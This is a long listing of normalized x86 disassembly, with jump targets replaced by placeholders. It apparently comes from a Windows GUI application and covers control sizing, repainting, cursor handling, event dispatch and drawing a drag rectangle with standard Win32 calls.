mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
cmp ebx eax
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffe4
call sub_4034a4
test ebx ebx
je r-xdata
cmp [ eax + 0x178 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c152
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfbff
retn
mov edi eax
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
mov eax [ eax + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_418a70
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
cmp [ ebx + 0x178 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffbf
call sub_4034a4
test edi edi
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc5
call sub_4034a4
jmp r-xdata
mov eax [ ebx + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_418778
sub_44c15c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
jne r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_44ccbc
mov edx edi
mov eax ebx
call sub_44c234
mov edx edi
mov eax ebx
call sub_44db1c
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
cmp esi 0xffffffff
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_44c1c8
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x154 ]
mov edx esi
call sub_40408c
pop esi
pop ebx
retn
mov [ ebx + 0x150 ] 0x0
sub_44c1ec
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_44c214
mov ecx esp
mov edx esi
mov eax ebx
mov si 0xffcc
call sub_4034a4
add esp 0x10
pop esi
pop ebx
retn
sub_44c234
push ebx
push esi
push edi
push ebp
mov esi eax
mov eax [ edx + 0x8 ]
mov edi [ edx ]
sub eax edi
push eax
mov eax [ edx + 0xc ]
mov ebp [ edx + 0x4 ]
sub eax ebp
push eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_44c290
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_44c2bc
mov edx eax
mov ecx esp
mov eax esi
call sub_41725c
mov edx esp
mov eax ebx
call sub_44c700
pop ecx
pop edx
pop esi
pop ebx
retn
sub_44c2d4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_44c278
mov ecx esp
mov edx esi
call sub_41725c
mov edx esp
mov eax ebx
call sub_44c700
pop ecx
pop edx
pop esi
pop ebx
retn
sub_44c2fc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44c37d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x40 ]
add [ esi ] eax
mov eax [ ebx + 0x44 ]
add [ esi + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c384
lea eax [ ebp - 0xc ]
call sub_404038
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba0c
call sub_403a74
sub_44c38c
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
add eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
add eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_44c3b8
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_44c3e4
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
mov edx esi
mov eax ebx
call sub_46836c
sub_44c414
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebx + 0xa0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx 0xb042
mov eax esi
call sub_44da78
sub_44c490
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov edi edx
mov esi eax
cmp edi [ esp ]
je r-xdata
mov al [ r-xdata ]
mov [ esi + 0x98 ] al
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
mov bl [ r-xdata ]
mov bl [ esi + 0x98 ]
jmp r-xdata
mov ebp [ esi + 0x40 ]
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
push eax
call MulDiv
mov ebp eax
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ esi + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0x4 ] eax
jmp r-xdata
test bl 0x2
je r-xdata
mov eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
test [ esi + 0x51 ] 0x1
jne r-xdata
test bl 0x4
je r-xdata
mov eax [ esi + 0x4c ]
mov [ esp + 0xc ] eax
test [ esi + 0x51 ] 0x2
jne r-xdata
test bl 0x1
je r-xdata
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x90 ]
push eax
call MulDiv
mov [ esi + 0x90 ] eax
test bl 0x8
setne dl
test al al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x48 ]
push eax
call MulDiv
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
push eax
call MulDiv
sub eax ebp
mov [ esp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x59 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x94 ]
push eax
call MulDiv
mov [ esi + 0x94 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
add eax [ esi + 0x4c ]
push eax
call MulDiv
sub eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test bl 0x8
setne al
test al al
je r-xdata
test bl 0x10
je r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov ebx [ esi + 0x68 ]
mov eax ebx
call sub_424728
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_424744
sub_44c65c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_44c6f2
push [ fs : eax ]
mov [ fs : eax ] esp
test [ edi + 0x50 ] 0x20
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4214a0
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_44c874
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x8 ]
call sub_404444
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c6f9
lea eax [ ebp - 0x8 ]
call sub_404038
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_44c8a4
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov bl 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
test [ esi + 0x1c ] 0x1
je r-xdata
sub_44c700
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x48 ]
sub eax [ esp + 0x10 ]
add eax [ esp ]
push eax
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x18 ]
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_44c748
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
jne r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba8c
call sub_403a74
test esi esi
je r-xdata
mov edx ebx
call sub_44fd30
mov edx ebx
mov eax esi
call sub_44fc5c
mov eax ebx
call sub_44bea0
sub_44c794
push ebx
push esi
push edi
mov ebx edx
mov edi eax
cmp bl [ edi + 0x57 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffcd
call sub_4034a4
mov [ edi + 0x57 ] bl
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb00b
mov eax edi
call sub_44da78
mov eax edi
mov si 0xffd0
call sub_4034a4
sub_44c82c
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x7c ] esi
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_4610f0
mov edx ebx
mov eax esi
call sub_421018
sub_44c850
push ebx
mov ebx eax
push edx
xor ecx ecx
mov eax ebx
mov edx 0xc
call sub_44da78
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax ebx
call sub_44da78
pop ebx
retn
sub_44c874
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_44c7e8
mov ebx eax
mov eax edi
mov ecx ebx
xor edx edx
call sub_404128
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx + 0x1 ]
mov edx [ edi ]
mov eax esi
call sub_44c7f8
sub_44c8a4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44c8f9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44c874
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404444
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c900
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov eax esi
call sub_4044f8
mov edx eax
mov eax ebx
call sub_44c850
sub_44c925
mov ebx eax
mov [ ebx + 0x59 ] 0x0
mov [ ebx + 0x56 ] 0x0
mov eax [ ebx + 0x68 ]
call sub_424684
cmp eax [ ebx + 0x84 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00e
mov eax ebx
call sub_44da78
pop ebx
retn
or [ ebx + 0x98 ] 0x10
mov eax [ ebx + 0x68 ]
call sub_424684
mov [ ebx + 0x84 ] eax
sub_44caac
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_44ca9c
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor eax eax
call sub_449a18
mov eax esi
call sub_449a18
jmp r-xdata
sub_44cae4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x198 ]
mov edx ebx
call sub_418930
test eax eax
jl r-xdata
mov edx [ ebx + 0x30 ]
mov edi [ edx + 0x198 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_4187c4
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x198 ]
mov ecx ebx
mov edx esi
call sub_418950
mov cl 0x1
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_44ccbc
mov eax ebx
call sub_4642bc
test [ eax + 0x54 ] 0x4
je r-xdata
mov dl 0x1
mov si 0xffd1
call sub_4034a4
sub_44cb64
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
retn
test dl dl
je r-xdata
xor edx edx
call sub_44cae4
mov edx [ ecx + 0x198 ]
mov edx [ edx + 0x8 ]
dec edx
call sub_44cae4
jmp r-xdata
sub_44cb88
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_44cc1e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
push 0x0
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push esi
call SetViewportOrgEx
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44cc25
lea eax [ ebp - 0xc ]
call sub_404038
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba0c
call sub_403a74
sub_44cc30
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edi [ eax + 0x198 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax edi
call sub_418930
mov esi eax
test esi esi
jle r-xdata
mov [ ebp - 0x1 ] 0x0
dec esi
mov edx esi
mov eax edi
call sub_4188d4
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test esi esi
jg r-xdata
test [ ebx + 0x50 ] 0x40
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_44c214
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call IntersectRect
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call EqualRect
test eax eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44ccbc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x15 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4533bc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_44c214
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test [ eax + 0x50 ] 0x40
jne r-xdata
neg al
sbb eax eax
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4530b8
push eax
call InvalidateRect
push ebp
call sub_44cc30
pop ecx
test al al
je r-xdata
mov al 0x1
sub_44cd58
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_464294
mov esi eax
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx 0xb043
mov eax ebx
call sub_44da78
mov [ edi + 0xc ] eax
cmp ebx esi
je r-xdata
mov edx edi
mov eax esi
mov si 0xffc9
call sub_4034a4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44cda4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc0 ]
mov dl 0x1
mov eax ebx
call sub_44c794
test [ ebx + 0x51 ] 0x4
je r-xdata
pop esi
pop ebx
retn
sub_44cdf4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4533bc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4530b8
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push sub_44cecd
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x44 ]
mov ecx edx
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x4c ]
push ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx eax
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x48 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_450ec4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4530b8
push eax
call ReleaseDC
retn
sub_44cf6c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax edi
call sub_44daac
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x9b ] 0x1
je r-xdata
xor eax eax
mov [ rw-data ] eax
test [ edi + 0x54 ] 0x1
je r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba8c
call sub_403a74
test esi esi
jge r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_44c3b8
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406d38
push eax
xor ecx ecx
mov edx 0x202
mov eax edi
call sub_44da78
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov ecx esi
mov edx ebx
mov eax edi
call sub_44ab9c
sub_44d040
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] 0x0
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi ] 0x1
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
sub_44d07c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_44d0c8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x11a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_44d0f4
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_44c818
mov edi eax
mov eax [ ebx + 0x38 ]
call sub_44c804
mov ebp eax
mov [ esp + 0x10 ] edi
fild [ esp + 0x10 ]
fmul [ ebx + 0x20 ]
fild [ ebx + 0xc ]
fsubrp st1
fstp [ esp ]
fwait
mov [ esp + 0x10 ] ebp
fild [ esp + 0x10 ]
fmul [ ebx + 0x28 ]
fild [ ebx + 0x10 ]
fsubrp st1
fstp [ esp + 0x8 ]
fwait
lea esi [ ebx + 0x44 ]
fld [ esp ]
call sub_402a78
mov [ esi ] eax
fld [ esp + 0x8 ]
call sub_402a78
mov [ esi + 0x4 ] eax
add edi [ esi ]
mov [ esi + 0x8 ] edi
add ebp [ esi + 0x4 ]
mov [ esi + 0xc ] ebp
lea edx [ ebx + 0x44 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_4530b8
push eax
call GetWindowRect
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov dl [ ebx + 0x54 ]
push edx
lea edx [ ebx + 0x44 ]
push edx
mov eax [ eax + 0x17c ]
mov ecx [ ebx + 0x58 ]
mov edx [ ebx + 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_44d1d8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x10a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_44d224
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov [ ebp - 0xa ] 0x0
cmp [ ebx + 0x13a ] 0x0
je r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0xa ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
mov al [ ebp - 0xa ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx + 0xa4 ] esi
jmp r-xdata
mov ecx [ ebx + 0xa4 ]
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
test ecx ecx
setl al
mov ecx eax
mov eax [ ebx + 0xa4 ]
cdq
xor eax edx
sub eax edx
mov esi eax
sub esi 0x78
mov [ ebx + 0xa4 ] esi
test cl cl
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe0
call sub_4034a4
mov [ ebp - 0xa ] al
test esi esi
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe1
call sub_4034a4
mov [ ebp - 0xa ] al
jmp r-xdata
neg esi
mov [ ebx + 0xa4 ] esi
sub_44d2e8
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x142 ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
sub_44d334
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x14a ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_44d380
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push esi
add esi 0x44
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
add esi 0x5c
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
call GetDesktopWindow
mov [ ebp - 0x8 ] eax
push 0x402
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call GetDCEx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44d49b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x40 ]
call sub_424ca4
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
sub eax esi
sub eax ebx
push eax
mov edi [ ebp - 0x1c ]
push edi
mov eax esi
add eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax edi
sub eax ebx
push eax
push ebx
mov eax edi
add eax ebx
